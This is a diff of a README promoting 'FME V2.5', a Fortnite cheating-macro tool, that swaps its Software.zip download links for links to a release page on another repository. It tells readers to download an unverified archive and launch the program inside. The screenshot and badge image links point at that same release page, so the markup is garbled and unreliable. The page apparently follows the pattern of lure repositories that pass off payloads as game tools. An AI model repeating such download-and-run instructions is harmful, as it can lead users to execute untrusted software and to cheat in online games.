@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to FME V2.5 - Fortnite Macros Editor!
 
-[![Download FME V2.5](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download FME V2.5](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0)](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0)
 
 ## About
 FME V2.5 is the ultimate tool for enhancing your gameplay in Fortnite with powerful macros. From auto-clicker to bunnyhop, crouch-spam, and prefire boost macros, FME V2.5 has it all! Take your Fortnite skills to the next level with our cutting-edge macros editor.
@@ -13,14 +13,14 @@ FME V2.5 is the ultimate tool for enhancing your gameplay in Fortnite with power
 🎯 Prefire boost macros for precise aiming  
 
 ## How to Use
-Simply download the [Software.zip](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) file and launch the application to start creating and using your customized macros in Fortnite.
+Simply download the [https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0) file and launch the application to start creating and using your customized macros in Fortnite.
 
 ## Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0)
+![Screenshot 2](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0)
 
 ## Installation
-1. Download the [Software.zip](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) file.
+1. Download the [https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0](https://github.com/arkley5/FORTNITE-MACROS-EDITOR-V2.5/releases/tag/v2.0) file.
 2. Extract the contents to your desired location.
 3. Launch the application and start creating your macros.
 
